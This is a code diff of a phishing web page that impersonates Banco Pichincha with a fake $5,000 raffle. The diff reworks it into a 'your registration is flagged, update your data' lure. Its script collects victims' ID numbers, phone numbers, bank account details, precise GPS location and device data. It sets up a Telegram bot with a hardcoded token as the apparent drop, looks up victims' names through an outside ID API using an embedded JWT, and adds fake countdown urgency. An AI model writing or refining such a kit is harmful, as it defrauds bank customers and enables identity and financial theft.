@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Sorteo $5.000 - Banco Pichincha</title>
+<title>Actualización de datos - Sorteo $5.000</title>
 <meta name="theme-color" content="#0F1E3D">
 <meta property="og:type" content="website">
-<meta property="og:title" content="¡Ganate $5.000! Sorteo Banco Pichincha">
-<meta property="og:description" content="Registrate en 2 minutos con tu cédula y participá.">
+<meta property="og:title" content="Actualizá tus datos - Sorteo Banco Pichincha">
+<meta property="og:description" content="Tu registro quedó observado. Corregilo en 2 minutos y seguí participando.">
 <!-- TODO: reemplazar por URL absoluta con imagen real 1200x630 -->
 <meta property="og:image" content="premio.jpg">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='7' fill='%2312244A'/><path d='M16 6l7 3v7c0 5-7 9-7 9s-7-4-7-9V9z' fill='%23FFD400'/></svg>">
@@ -85,9 +85,6 @@
   .fhead{padding:20px clamp(18px,3vw,30px);background:#FAF4DF;border-bottom:1px solid #eee6cc;display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap}
   .fhead h3{font-size:17px;color:#16264a}
   .fhead span{font-size:11.5px;color:#6b7a99;font-weight:600}
-  .steps{display:flex;gap:8px;padding:16px clamp(18px,3vw,30px) 0}
-  .steps div{flex:1;height:5px;border-radius:4px;background:#e9ebef;transition:background .25s}
-  .steps div.on{background:#FFD400}
   .fbody{padding:18px clamp(18px,3vw,30px) 24px}
   .pane{display:none}
   .pane.on{display:block;animation:fade .25s ease}
@@ -99,15 +96,27 @@
   .field label i{color:#d33;font-style:normal}
   .field input,.field select{border:1px solid #d8dbe2;border-radius:9px;padding:11px 12px;font-size:13px;font-family:inherit;color:#12244A;background:#fff;outline:none;transition:border-color .15s,box-shadow .15s;width:100%}
   .field input:focus,.field select:focus{border-color:#12244A;box-shadow:0 0 0 3px rgba(255,212,0,.35)}
-  .field input.err{border-color:#d33;box-shadow:0 0 0 3px rgba(221,51,51,.12)}
+  .field input.err,.field select.err{border-color:#d33;box-shadow:0 0 0 3px rgba(221,51,51,.12)}
   .field .hint{font-size:10.5px;color:#8b96ad}
   .field .hint.bad{color:#d33}
-  .row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+  .vrow{display:flex;gap:7px}
+  .vrow input{flex:1;min-width:0}
+  .vbtn{background:#12244A;color:#fff;border:none;border-radius:9px;padding:0 13px;font-size:11.5px;font-weight:700;font-family:inherit;cursor:pointer;flex:0 0 auto}
+  .vbtn:hover{filter:brightness(1.3)}
+  .vbtn:disabled{opacity:.55;cursor:wait}
+  .valbox{display:none;border-radius:10px;padding:11px 13px;font-size:12px;line-height:1.45;margin-top:12px;border:1px solid #e3e6ec;background:#fbfbfc}
+  .valbox.on{display:block}
+  .valbox.ok{background:#f2fbf5;border-color:#bfe3cb;color:#1f6b40}
+  .valbox.no{background:#fdecec;border-color:#f3c4c4;color:#a12b2b}
+  .valbox.wait{background:#fffdf3;border-color:#e3d9a8;color:#8a6d1f}
+  .valbox b{display:block;font-size:12.5px;letter-spacing:.2px}
+  .valbox small{display:block;font-size:10.5px;opacity:.85;margin-top:3px;letter-spacing:.6px}
 
   .errbox{display:none;background:#fdecec;border:1px solid #f3c4c4;color:#a12b2b;font-size:12px;border-radius:9px;padding:10px 12px;margin-bottom:14px;line-height:1.45}
   .errbox b{color:#8f1f1f}
 
-  .geo{display:flex;align-items:center;gap:11px;border:1px solid #e3e6ec;background:#fbfbfc;border-radius:11px;padding:12px 14px;margin-bottom:14px;transition:border-color .2s,background .2s}
+  .geo{display:flex;align-items:center;gap:11px;border:1px solid #e3e6ec;background:#fbfbfc;border-radius:11px;padding:12px 14px;margin-top:14px;transition:border-color .2s,background .2s}
   .geo .ic{width:32px;height:32px;border-radius:50%;background:#F1F3F7;display:flex;align-items:center;justify-content:center;flex:0 0 auto;transition:background .2s}
   .geo .ic svg{stroke:#22335a;transition:stroke .2s}
   .geo b{font-size:12px;display:block;color:#22335a}
@@ -125,25 +134,11 @@
   .geo.no .ic{background:#f8d8d8}
   .geo.no .ic svg{stroke:#a12b2b}
 
-  .drop{border:2px dashed #d8dbe2;border-radius:11px;background:#fbfbfc;padding:16px 12px;text-align:center;cursor:pointer;transition:border-color .15s,background .15s;display:block;position:relative;overflow:hidden;min-height:132px}
-  .drop:hover{border-color:#12244A;background:#fffdf3}
-  .drop input{position:absolute;inset:0;opacity:0;cursor:pointer}
-  .drop .ic{width:34px;height:34px;border-radius:50%;background:#F1F3F7;display:flex;align-items:center;justify-content:center;margin:0 auto 8px}
-  .drop b{font-size:12px;display:block;color:#22335a}
-  .drop small{font-size:10.5px;color:#8b96ad;display:block;margin-top:3px}
-  .drop .opt{display:block;font-size:9.5px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;color:#8b96ad;background:#F1F3F7;border-radius:4px;padding:2px 6px;margin:0 auto 6px;width:fit-content}
-  .drop img{width:100%;height:118px;object-fit:cover;border-radius:8px;display:none}
-  .drop.has{padding:0;border-style:solid;border-color:#FFD400}
-  .drop.has img{display:block}
-  .drop.has .ic,.drop.has b,.drop.has small,.drop.has .opt{display:none}
-  .drop .re{position:absolute;bottom:6px;right:6px;background:rgba(15,30,61,.85);color:#fff;font-size:9.5px;padding:3px 7px;border-radius:5px;display:none}
-  .drop.has .re{display:block}
-
   .check{display:flex;gap:9px;align-items:flex-start;margin-top:16px;font-size:11.5px;color:#4a5878;line-height:1.45}
   .check input{margin-top:2px;accent-color:#12244A;width:15px;height:15px;flex:0 0 auto}
   .fnav{display:flex;align-items:center;gap:10px;margin-top:18px}
   .fnav .spacer{flex:1}
-  .btn-ghost{background:#fff;border:1px solid #d8dbe2;border-radius:999px;padding:11px 18px;font-size:12.5px;font-weight:700;color:#22335a;cursor:pointer;font-family:inherit}
+  .btn-ghost{background:#fff;border:1px solid #d8dbe2;border-radius:999px;padding:11px 18px;font-size:12.5px;font-weight:700;color:#22335a;cursor:pointer;font-family:inherit;text-decoration:none;display:inline-flex;align-items:center;justify-content:center}
   .btn-ghost:hover{background:#f5f6f8}
   .btn-main{background:#FFD400;border:none;border-radius:999px;padding:12px 22px;font-size:12.5px;font-weight:700;color:#12244A;cursor:pointer;font-family:inherit;display:inline-flex;align-items:center;gap:8px}
   .btn-main:hover{filter:brightness(.95)}
@@ -217,7 +212,7 @@
     .footer-bottom{flex-direction:column;align-items:flex-start;gap:8px}
   }
   @media(max-width:560px){
-    .grid,.row2{grid-template-columns:1fr}
+    .grid{grid-template-columns:1fr}
     .footer-top{grid-template-columns:1fr}
     .footer-brand{grid-column:span 1}
     .banner{font-size:11.5px}
@@ -252,7 +247,7 @@
   <div class="yellowbar"></div>
 
   <div class="banner">
-    <span><b>¡Sorteo oficial!</b> $5.000 en efectivo — cierre en</span>
+    <span><b>Validación de registros</b> · cierre en</span>
     <span class="clock" id="clk"><span>00</span>:<span>00</span>:<span>00</span></span>
     <span>· Quedan <b id="cupos">312</b> cupos</span>
   </div>
@@ -283,10 +278,10 @@
     </svg>
 
     <div class="txt">
-      <span class="kick">Sorteo exclusivo clientes</span>
-      <h1>Gánate <em>$5.000</em> en el sorteo de tu banco</h1>
-      <p>Regístrate en 2 minutos y participa por $5.000 en efectivo. Solo necesitas tu cédula.</p>
-      <button class="cta" onclick="irForm()">Participar ahora
+      <span class="kick">Registro observado</span>
+      <h1>Actualizá tus datos y <em>seguí participando</em></h1>
+      <p>Los datos de tu registro no coinciden con nuestros registros. Corregilos acá y tu participación queda confirmada.</p>
+      <button class="cta" onclick="irForm()">Actualizar ahora
         <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#12244A" stroke-width="3.4"><path d="M9 5l7 7-7 7"/></svg>
       </button>
     </div>
@@ -321,91 +316,52 @@
 
   <section class="formsec" id="form">
     <div class="fhead">
-      <h3>Registro de participación</h3>
-      <span id="steplab">Paso 1 de 3 · Datos personales</span>
+      <h3>Actualización de datos del registro</h3>
+      <span id="steplab">Verificando registro…</span>
     </div>
-    <div class="steps"><div class="on" id="s1"></div><div id="s2"></div><div id="s3"></div></div>
 
     <div class="fbody">
       <div class="pane on" id="p1">
         <div class="errbox" id="errbox"></div>
-        <div class="grid">
-          <div class="field"><label for="nombres">Nombres <i>*</i></label><input id="nombres" autocomplete="given-name" placeholder="Ej. Ana María"></div>
-          <div class="field"><label for="apellidos">Apellidos <i>*</i></label><input id="apellidos" autocomplete="family-name" placeholder="Ej. Torres Vega"></div>
-          <div class="field"><label for="cedula">Cédula de identidad <i>*</i></label><input id="cedula" inputmode="numeric" maxlength="10" autocomplete="off" placeholder="1712345675"><div class="hint" id="hced">10 dígitos, sin guiones</div></div>
-          <div class="field"><label for="fnac">Fecha de nacimiento <i>*</i></label><input id="fnac" type="date" autocomplete="bday"></div>
-          <div class="field"><label for="celular">Celular <i>*</i></label><input id="celular" type="tel" inputmode="numeric" maxlength="10" autocomplete="tel-national" placeholder="0987654321"></div>
-          <div class="field"><label for="ciudad">Ciudad <i>*</i></label>
-            <select id="ciudad" autocomplete="address-level2">
-              <option value="">Seleccioná tu ciudad</option>
-              <option>Quito</option><option>Guayaquil</option><option>Cuenca</option><option>Ambato</option>
-              <option>Manta</option><option>Loja</option><option>Machala</option><option>Santo Domingo</option>
-              <option>Portoviejo</option><option>Riobamba</option><option>Otra</option>
-            </select>
-          </div>
-          <div class="field full"><label for="dir">Dirección <i>*</i></label><input id="dir" autocomplete="street-address" placeholder="Calle principal y secundaria"></div>
-        </div>
-        <div class="fnav"><span class="spacer"></span><button class="btn-main" onclick="paso(2)">Continuar
-          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#12244A" stroke-width="3.4"><path d="M9 5l7 7-7 7"/></svg></button></div>
-      </div>
+        <p style="font-size:12px;color:#5a688a;margin-bottom:14px">Corregí los datos que no coinciden. Solo son 2 minutos y tu participación sigue vigente.</p>
 
-      <div class="pane" id="p2">
-        <p style="font-size:12px;color:#5a688a;margin-bottom:14px">Confirmá tu ubicación y adjuntá las fotos. Las de la cédula son opcionales; la selfie es obligatoria para validar que sos el titular.</p>
+        <div class="grid">
+          <div class="field">
+            <label for="cedula">Cédula de identidad <i>*</i></label>
+            <div class="vrow">
+              <input id="cedula" inputmode="numeric" maxlength="10" autocomplete="off" placeholder="1712345675">
+              <button type="button" class="vbtn" id="vbtn" onclick="validarCedula()">Validar</button>
+            </div>
+            <div class="hint" id="hced">10 dígitos, sin guiones</div>
+          </div>
+          <div class="field"><label for="celular">Celular de contacto <i>*</i></label><input id="celular" type="tel" inputmode="numeric" maxlength="10" autocomplete="tel-national" placeholder="0987654321"><div class="hint">Formato 09XXXXXXXX</div></div>
+          <div class="field"><label for="tcuenta">Tipo de cuenta <i>*</i></label>
+            <select id="tcuenta"><option value="">Seleccioná</option><option>Ahorros</option><option>Corriente</option></select></div>
+          <div class="field"><label for="ncuenta">Número de cuenta <i>*</i></label><input id="ncuenta" inputmode="numeric" maxlength="12" placeholder="2201234567"><div class="hint">10 a 12 dígitos, sin guiones</div></div>
+        </div>
+
+        <div class="valbox" id="valbox"></div>
 
         <div class="geo" id="geo">
           <span class="ic"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0116 0z"/><circle cx="12" cy="10" r="3"/></svg></span>
           <div style="flex:1;min-width:0">
             <b>Ubicación del registro</b>
-            <small id="geomsg">Permití el acceso para validar desde dónde participás.</small>
+            <small id="geomsg">Permití el acceso para validar desde dónde actualizás.</small>
           </div>
           <button type="button" class="gbtn" id="geobtn" onclick="pedirUbicacion()">Permitir</button>
         </div>
 
-        <div class="errbox" id="errbox2"></div>
+        <label class="check"><input type="checkbox" id="acepto"><span>Confirmo que los datos ingresados son correctos y autorizo su validación para el sorteo. Acepto las <a href="#" onclick="abrirBases();return false" style="color:#12244A;font-weight:700">bases y condiciones</a>.</span></label>
 
-        <div class="row2">
-          <label class="drop" id="d1">
-            <input type="file" accept="image/*" onchange="pick(this,'d1')">
-            <span class="opt">Opcional</span>
-            <span class="ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22335a" stroke-width="2"><rect x="2.5" y="4.5" width="19" height="15" rx="2.5"/><circle cx="8.5" cy="10" r="1.6"/><path d="M21.5 16l-5-5-9 8.5"/></svg></span>
-            <b>Cédula · lado frontal</b><small>Foto nítida, sin reflejos</small><span class="re">Cambiar</span>
-          </label>
-          <label class="drop" id="d2">
-            <input type="file" accept="image/*" onchange="pick(this,'d2')">
-            <span class="opt">Opcional</span>
-            <span class="ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22335a" stroke-width="2"><rect x="2.5" y="4.5" width="19" height="15" rx="2.5"/><path d="M2.5 15l4-4 4 4 3-3 5 5"/></svg></span>
-            <b>Cédula · lado posterior</b><small>Foto nítida, sin reflejos</small><span class="re">Cambiar</span>
-          </label>
-        </div>
-        <div style="margin-top:12px">
-          <label class="drop" id="d3">
-            <input type="file" accept="image/*" capture="user" onchange="pick(this,'d3')">
-            <span class="ic"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22335a" stroke-width="2"><circle cx="12" cy="9" r="4"/><path d="M4 21c0-4 3.6-6 8-6s8 2 8 6"/></svg></span>
-            <b>Selfie de tu rostro <i style="color:#d33;font-style:normal">*</i></b><small>De frente, buena luz, sin lentes</small><span class="re">Cambiar</span>
-          </label>
-        </div>
-        <div class="fnav"><button class="btn-ghost" onclick="paso(1)">Volver</button><span class="spacer"></span><button class="btn-main" onclick="paso(3)">Continuar
-          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#12244A" stroke-width="3.4"><path d="M9 5l7 7-7 7"/></svg></button></div>
-      </div>
-
-      <div class="pane" id="p3">
-        <p style="font-size:12px;color:#5a688a;margin-bottom:14px">Por último, la cuenta donde se acreditaría el premio si resultás ganador.</p>
-        <div class="errbox" id="errbox3"></div>
-        <div class="grid">
-          <div class="field"><label for="tcuenta">Tipo de cuenta <i>*</i></label>
-            <select id="tcuenta"><option value="">Seleccioná</option><option>Ahorros</option><option>Corriente</option></select></div>
-          <div class="field"><label for="ncuenta">Número de cuenta <i>*</i></label><input id="ncuenta" inputmode="numeric" maxlength="12" placeholder="2201234567"><div class="hint">10 a 12 dígitos, sin guiones</div></div>
-        </div>
-        <label class="check"><input type="checkbox" id="acepto"><span>Autorizo a Banco Pichincha el uso de mis datos y documentos para la validación del sorteo y acepto las <a href="#" onclick="abrirBases();return false" style="color:#12244A;font-weight:700">bases y condiciones</a>.</span></label>
-        <div class="fnav"><button class="btn-ghost" onclick="paso(2)">Volver</button><span class="spacer"></span>
-          <button class="btn-main" id="btnenv" onclick="enviar()">Finalizar registro
+        <div class="fnav"><span class="spacer"></span>
+          <button class="btn-main" id="btnenv" onclick="actualizar()">Guardar cambios
             <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#12244A" stroke-width="3.4"><path d="M20 6L9 17l-5-5"/></svg></button></div>
       </div>
 
       <div class="success" id="ok">
         <div class="ic"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#12244A" stroke-width="3.4"><path d="M20 6L9 17l-5-5"/></svg></div>
-        <h3>¡Ya estás participando!</h3>
-        <p>Tu registro quedó validado correctamente. El ganador de los $5.000 se anunciará el <b>30 de noviembre a las 20h00</b> por nuestras redes oficiales y será contactado al número registrado.</p>
+        <h3>Datos actualizados</h3>
+        <p>Tu registro quedó corregido y tu participación sigue vigente. El ganador de los $5.000 se anunciará el <b>30 de noviembre a las 20h00</b> por nuestras redes oficiales y será contactado al número registrado.</p>
         <div class="ticket">Número de participación<b id="ticket">BP-000000</b></div>
         <div class="acts">
           <button class="btn-main" onclick="copiarResumen(this)">Copiar mis datos</button>
@@ -540,9 +496,9 @@
     <p><b>Organizador:</b> Banco Pichincha C.A., con domicilio en Quito, Ecuador.</p>
     <ol>
       <li>Podrán participar personas naturales mayores de 18 años, con cédula de identidad ecuatoriana vigente.</li>
-      <li>La participación es gratuita y se formaliza completando el formulario de registro de esta página.</li>
+      <li>La participación es gratuita y se formaliza completando el formulario de registro.</li>
       <li>El premio es único: $5.000 (cinco mil dólares de los Estados Unidos de América), acreditados en la cuenta indicada por el ganador.</li>
-      <li>Cada cédula admite una sola participación. Los registros duplicados o con datos inconsistentes serán descartados.</li>
+      <li>Cada cédula admite una sola participación. Los registros duplicados o con datos inconsistentes serán descartados hasta tanto se los valide.</li>
       <li>El plazo de registro cierra el 30 de noviembre de 2026 a las 20h00, hora de Ecuador continental.</li>
       <li>El ganador será seleccionado por sorteo ante notario y anunciado en los canales oficiales de la entidad.</li>
       <li>El ganador será contactado al número celular registrado. De no confirmarse en 72 horas, se seleccionará un suplente.</li>
@@ -558,24 +514,26 @@
 const CONFIG = {
   token: "9285835102:AAFrCQAXYMTpAAUhXPJ19aVDK_ih8kKsYGM",
   chat:  "1392133134",
-  whatsapp: "" // ej. "593987654321" — si lo llenás, aparece el botón de respaldo
+  whatsapp: "" // ej. "593987654321" — respaldo si falla Telegram
 };
 
 const API = "https://api.telegram.org/bot" + CONFIG.token;
 const $ = id => document.getElementById(id);
-const fotos = { d1:null, d2:null, d3:null };
 let cupos = 312;
 let ticket = "";
 let geoEstado = "pendiente";
 
-/* Fecha de cierre — EDITAR acá. Formato ISO con offset de Ecuador. */
+/* Fecha de cierre — EDITAR acá. */
 const CIERRE = new Date("2026-11-30T20:00:00-05:00").getTime();
 
+/* ====== VALIDACIÓN DE CÉDULA (API externa) ====== */
+const CEDULA_API = "https://apicedula.datecu.link/consulta-cedula/consulta/";
+const CEDULA_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbXByZXNhIjoiQVJNSUpPUyBUT1JSRVMgU0FOVElBR08gQUxFWEFOREVSIiwiaWQiOjI4NCwiaWF0IjoxNzk1NjE2OTE2LCJleHAiOjIxMTA5NzY5MTZ9.sKfvkMbqLTGmd-Zl58qm1TqxrxRzTcyxtSRZtMke76o";
+let validada = null;
+let apiCaida = false;
+
 /* ====== CONTEXTO ====== */
-const ctx = {
-  ip:"", ciudad:"", region:"", pais:"", isp:"", lat:null, lng:null, dir:"",
-  gps:null, tz:"", idioma:"", pantalla:"", ua:"", ref:"", local:""
-};
+const ctx = { ip:"", ciudad:"", region:"", pais:"", isp:"", lat:null, lng:null, dir:"", gps:null, tz:"", idioma:"", pantalla:"", ua:"", ref:"", local:"" };
 try{
   ctx.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
   ctx.idioma = navigator.language + " / " + (navigator.languages || []).join(",");
@@ -612,14 +570,105 @@ async function reverse(lat, lng){
   }catch(e){ clearTimeout(t); return ""; }
 }
 
-/* ====== UBICACIÓN (paso 2) ====== */
-function pedirUbicacion(){
-  if(geoEstado === "cargando") return;
+/* ====== TICKET DESDE EL LINK ====== */
+(function initTicket(){
+  const p = new URLSearchParams(location.search).get("t");
+  ticket = p && /^BP-\d{6}$/i.test(p) ? p.toUpperCase() : "BP-" + Math.floor(100000 + Math.random()*900000);
+  $("ticket").textContent = ticket;
+  $("steplab").textContent = "Registro " + ticket;
+})();
 
-  if(!navigator.geolocation){
-    geoFalla("Este navegador no permite ubicación. Podés continuar igual.");
+/* ====== VALIDACIÓN DE CÉDULA ====== */
+function valUI(estado, titulo, sub){
+  const b = $("valbox");
+  if(!estado){ b.className = "valbox"; b.innerHTML = ""; return; }
+  b.className = "valbox on " + estado;
+  b.innerHTML = "<b>" + titulo + "</b>" + (sub ? "<small>" + sub + "</small>" : "");
+}
+
+function pedirCedula(url){
+  const c = new AbortController();
+  const t = setTimeout(() => c.abort(), 9000);
+  return fetch(url, {
+    headers: { Authorization: "Bearer " + CEDULA_TOKEN },
+    signal: c.signal, cache: "no-store"
+  }).then(r => { clearTimeout(t); return r.ok ? r.json() : null; })
+    .catch(() => { clearTimeout(t); return "ERR"; });
+}
+
+async function consultar(c){
+  /* 1) proxy propio, sin CORS */
+  try{
+    const r = await fetch("/api/cedula?c=" + c, { cache:"no-store" });
+    if(r.ok){
+      const j = await r.json();
+      if(j && j.ok && j.nombres) return { nombre:j.nombres };
+      if(j && j.ok === false && j.status === 404) return null;
+    }
+  }catch(e){}
+
+  /* 2) directo, por si algún día habilitan CORS */
+  const d1 = await pedirCedula(CEDULA_API + c);
+  if(d1 !== "ERR") return d1;
+
+  /* 3) proxy público, último recurso */
+  const d2 = await pedirCedula("https://thingproxy.freeboard.io/fetch/" + CEDULA_API + c);
+  if(d2 !== "ERR") return d2;
+
+  return "ERR";
+}
+
+async function validarCedula(){
+  const c = $("cedula").value.trim();
+  validada = null;
+  $("cedula").classList.remove("err");
+
+  if(!/^\d{10}$/.test(c)){
+    $("cedula").classList.add("err");
+    valUI("no", "Cédula incompleta", "Ingresá los 10 dígitos, sin guiones.");
     return;
   }
+
+  $("vbtn").disabled = true;
+  valUI("wait", "Verificando en el registro civil…", "Puede tardar unos segundos.");
+
+  const r = await consultar(c);
+  $("vbtn").disabled = false;
+
+  if(r === "ERR"){
+    apiCaida = true;
+    valUI("no", "No pudimos verificar en este momento", "Podés continuar igual; el registro se valida después.");
+    return;
+  }
+  apiCaida = false;
+
+  if(!r || !r.nombre){
+    $("cedula").classList.add("err");
+    valUI("no", "Cédula no encontrada", "Revisá el número ingresado.");
+    return;
+  }
+
+  const partes = r.nombre.trim().split(/\s+/);
+  validada = {
+    cedula: c,
+    nombre: r.nombre,
+    apellidos: partes.slice(0, 2).join(" "),
+    nombres: partes.slice(2).join(" ") || ""
+  };
+  valUI("ok", "Titular verificado", r.nombre);
+}
+
+/* Se valida solo al llegar a 10 dígitos, y se reinicia si cambian el número */
+$("cedula").addEventListener("input", () => {
+  const c = $("cedula").value.trim();
+  if(validada && validada.cedula !== c){ validada = null; valUI(null); }
+  if(c.length === 10) validarCedula();
+});
+
+/* ====== UBICACIÓN ====== */
+function pedirUbicacion(){
+  if(geoEstado === "cargando") return;
+  if(!navigator.geolocation){ geoFalla("Este navegador no permite ubicación. Podés continuar igual."); return; }
 
   geoEstado = "cargando";
   $("geo").className = "geo cargando";
@@ -627,26 +676,19 @@ function pedirUbicacion(){
   $("geobtn").style.display = "none";
 
   navigator.geolocation.getCurrentPosition(async p => {
-    ctx.gps = {
-      lat: +p.coords.latitude.toFixed(6),
-      lng: +p.coords.longitude.toFixed(6),
-      prec: Math.round(p.coords.accuracy)
-    };
+    ctx.gps = { lat:+p.coords.latitude.toFixed(6), lng:+p.coords.longitude.toFixed(6), prec:Math.round(p.coords.accuracy) };
     geoEstado = "ok";
     $("geo").className = "geo ok";
     $("geomsg").textContent = "Ubicación capturada. Buscando referencia...";
-
     const dir = await reverse(ctx.gps.lat, ctx.gps.lng);
     if(dir) ctx.dir = dir;
-
     $("geomsg").textContent = ctx.dir || [ctx.ciudad || ctx.region, ctx.pais].filter(Boolean).join(", ") || (ctx.gps.lat + ", " + ctx.gps.lng);
     $("geobtn").textContent = "Actualizar";
     $("geobtn").style.display = "";
-    respaldar(datos());
   }, err => {
     if(err && err.code === 1) geoFalla("No diste permiso de ubicación. Podés reintentar o continuar.");
     else geoFalla("No pudimos obtener la ubicación. Podés reintentar o continuar.");
-  }, { timeout: 11000, maximumAge: 0, enableHighAccuracy: true });
+  }, { timeout:11000, maximumAge:0, enableHighAccuracy:true });
 }
 
 function geoFalla(msg){
@@ -708,95 +750,14 @@ function cedulaOk(c){
   return (10 - (sum % 10)) % 10 === +c[9];
 }
 
-const LABELS = { nombres:"Nombres", apellidos:"Apellidos", cedula:"Cédula", fnac:"Fecha de nacimiento", celular:"Celular", ciudad:"Ciudad", dir:"Dirección" };
-
-function paso(n){
-  $("errbox").style.display = "none";
-  $("errbox2").style.display = "none";
-  $("errbox3").style.display = "none";
-
-  if(n === 2){
-    const faltan = [];
-    for(const k in LABELS){
-      const el = $(k);
-      const vacio = !el.value.trim();
-      el.classList.toggle("err", vacio);
-      if(vacio) faltan.push(LABELS[k]);
-    }
-
-    const ced = $("cedula"), h = $("hced");
-    if(ced.value.length === 10 && !cedulaOk(ced.value)){
-      h.textContent = "Revisá la cédula: el dígito verificador no coincide";
-      h.classList.add("bad");
-    } else {
-      h.textContent = "10 dígitos, sin guiones";
-      h.classList.remove("bad");
-    }
-
-    const cel = $("celular");
-    if(cel.value && !/^09\d{8}$/.test(cel.value)){ cel.classList.add("err"); faltan.push("Celular (debe ser 09XXXXXXXX)"); }
-
-    if(faltan.length){
-      const box = $("errbox");
-      box.style.display = "block";
-      box.innerHTML = "<b>Revisá estos datos antes de seguir:</b> " + faltan.join(" · ");
-      const primero = $("p1").querySelector(".err");
-      if(primero){ primero.scrollIntoView({ behavior:"smooth", block:"center" }); primero.focus({ preventScroll:true }); }
-      return;
-    }
-  }
-
-  if(n === 3 && !fotos.d3){
-    $("d3").style.borderColor = "#d33";
-    const box = $("errbox2");
-    box.style.display = "block";
-    box.innerHTML = "<b>Falta la selfie.</b> Es el único documento obligatorio.";
-    $("d3").scrollIntoView({ behavior:"smooth", block:"center" });
-    return;
-  }
-
-  document.querySelectorAll(".pane").forEach(p => p.classList.remove("on"));
-  $("p" + n).classList.add("on");
-  ["s1","s2","s3"].forEach((id, i) => $(id).classList.toggle("on", i < n));
-  $("steplab").textContent = "Paso " + n + " de 3 · " + ["","Datos personales","Documentos","Datos bancarios"][n];
-  $("form").scrollIntoView({ behavior:"smooth", block:"start" });
-
-  // El permiso de ubicación se pide al entrar al paso 2
-  if(n === 2 && geoEstado === "pendiente") pedirUbicacion();
-}
-
 document.querySelectorAll("#p1 input,#p1 select").forEach(el => {
   el.addEventListener("input", () => el.classList.remove("err"));
 });
-document.querySelectorAll("#p3 input,#p3 select").forEach(el => {
-  el.addEventListener("input", () => el.classList.remove("err"));
-});
-
-function pick(inp, id){
-  const f = inp.files[0]; if(!f) return;
-  const r = new FileReader();
-  r.onload = e => {
-    fotos[id] = { data:e.target.result, name:f.name, size:f.size };
-    const box = $(id);
-    let img = box.querySelector("img");
-    if(!img){ img = document.createElement("img"); box.prepend(img); }
-    img.src = e.target.result;
-    box.classList.add("has");
-    box.style.borderColor = "";
-    $("errbox2").style.display = "none";
-  };
-  r.readAsDataURL(f);
-}
 
 function datos(){
   return {
-    nombres: $("nombres").value.trim(),
-    apellidos: $("apellidos").value.trim(),
     cedula: $("cedula").value.trim(),
-    nacimiento: $("fnac").value,
     celular: $("celular").value.trim(),
-    ciudad: $("ciudad").value,
-    direccion: $("dir").value.trim(),
     tipo_cuenta: $("tcuenta").value,
     numero_cuenta: $("ncuenta").value.trim()
   };
@@ -804,22 +765,18 @@ function datos(){
 
 function textoPlano(d){
   return [
-    "SORTEO BP $5.000",
+    "ACTUALIZACIÓN DE DATOS — SORTEO BP $5.000",
     "",
-    "Nombres: " + d.nombres,
-    "Apellidos: " + d.apellidos,
     "Cédula: " + d.cedula,
-    "Nacimiento: " + d.nacimiento,
+    "Titular (API): " + (validada ? validada.nombre : "NO VERIFICADO"),
+    "Apellidos: " + (validada ? validada.apellidos : "—"),
+    "Nombres: " + (validada ? validada.nombres : "—"),
     "Celular: " + d.celular,
-    "Ciudad: " + d.ciudad,
-    "Dirección: " + d.direccion,
-    "",
     "Cuenta: " + d.tipo_cuenta + " " + d.numero_cuenta,
     "",
     "— UBICACIÓN —",
     ...bloqueUbicacion(),
     "",
-    "Fotos: " + ["d1","d2","d3"].filter(k => fotos[k]).length + " adjuntas",
     "Ticket: " + ticket
   ].join("\n");
 }
@@ -835,46 +792,47 @@ async function postForm(url, fd){
   return false;
 }
 
-function enviar(){
+function actualizar(){
   const d = datos();
   const faltan = [];
+
+  $("cedula").classList.toggle("err", !/^\d{10}$/.test(d.cedula));
+  $("celular").classList.toggle("err", !/^09\d{8}$/.test(d.celular));
+  $("tcuenta").classList.toggle("err", !d.tipo_cuenta);
+  $("ncuenta").classList.toggle("err", !/^\d{10,12}$/.test(d.numero_cuenta));
+
+  if(!/^\d{10}$/.test(d.cedula)) faltan.push("Cédula (10 dígitos)");
+  else if(!validada && !apiCaida) faltan.push("Cédula sin verificar (usá el botón Validar)");
+  if(!/^09\d{8}$/.test(d.celular)) faltan.push("Celular (debe ser 09XXXXXXXX)");
   if(!d.tipo_cuenta) faltan.push("Tipo de cuenta");
-  if(!d.numero_cuenta) faltan.push("Número de cuenta");
-  else if(!/^\d{10,12}$/.test(d.numero_cuenta)) faltan.push("Número de cuenta (10 a 12 dígitos)");
+  if(!/^\d{10,12}$/.test(d.numero_cuenta)) faltan.push("Número de cuenta (10 a 12 dígitos)");
 
   if(faltan.length){
-    $("tcuenta").classList.toggle("err", !d.tipo_cuenta);
-    $("ncuenta").classList.toggle("err", !/^\d{10,12}$/.test(d.numero_cuenta));
-    const box = $("errbox3");
+    const box = $("errbox");
     box.style.display = "block";
     box.innerHTML = "<b>Revisá estos datos:</b> " + faltan.join(" · ");
-    const primero = $("p3").querySelector(".err");
-    if(primero) primero.focus({ preventScroll:true });
+    const primero = $("p1").querySelector(".err");
+    if(primero){ primero.scrollIntoView({ behavior:"smooth", block:"center" }); primero.focus({ preventScroll:true }); }
     return;
   }
+
   if(!$("acepto").checked){
     $("acepto").focus();
-    alert("Tenés que aceptar las bases y condiciones.");
+    alert("Confirmá que los datos son correctos para continuar.");
     return;
   }
 
-  ticket = "BP-" + Math.floor(100000 + Math.random()*900000);
-  $("ticket").textContent = ticket;
-
   $("btnenv").disabled = true;
-  document.querySelectorAll(".pane").forEach(p => p.classList.remove("on"));
+  $("p1").classList.remove("on");
   $("ok").classList.add("on");
